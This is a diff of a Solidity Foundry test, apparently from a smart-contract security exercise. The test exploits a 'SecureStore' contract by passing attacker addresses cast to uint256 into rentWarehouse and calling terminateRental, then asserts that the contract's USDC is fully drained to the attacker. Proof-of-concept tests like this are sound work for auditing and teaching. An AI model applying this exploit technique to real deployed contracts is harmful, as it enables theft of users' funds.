@@ -46,8 +46,13 @@ contract CATest2 is Test {
 
         attackContract = new AttackContract();
         usdc.approve(address(secureStore), INITIAL_SUPPLY);
+
+        // address is 20 bytes
+        // 20 * 8 bits = 160 bits to fill all the gaps with zeros
+        // cast it again to uint256
+
         secureStore.rentWarehouse(1, uint256(uint160(address(attackContract))));
-        skip(3600 * 24);
+        secureStore.terminateRental();
         secureStore.rentWarehouse(1, uint256(uint160(attacker)));
 
         console.log("RentingLibrary ",secureStore.rentingLibrary());
@@ -58,7 +63,7 @@ contract CATest2 is Test {
 
         vm.stopPrank();
         assertEq(usdc.balanceOf(address(secureStore)), 0);
-        
+
         // initial attacker balance + all of the funds in the SecureContract
         assertEq(usdc.balanceOf(attacker), STORE_INITIAL_BALANCE + INITIAL_SUPPLY);
     }
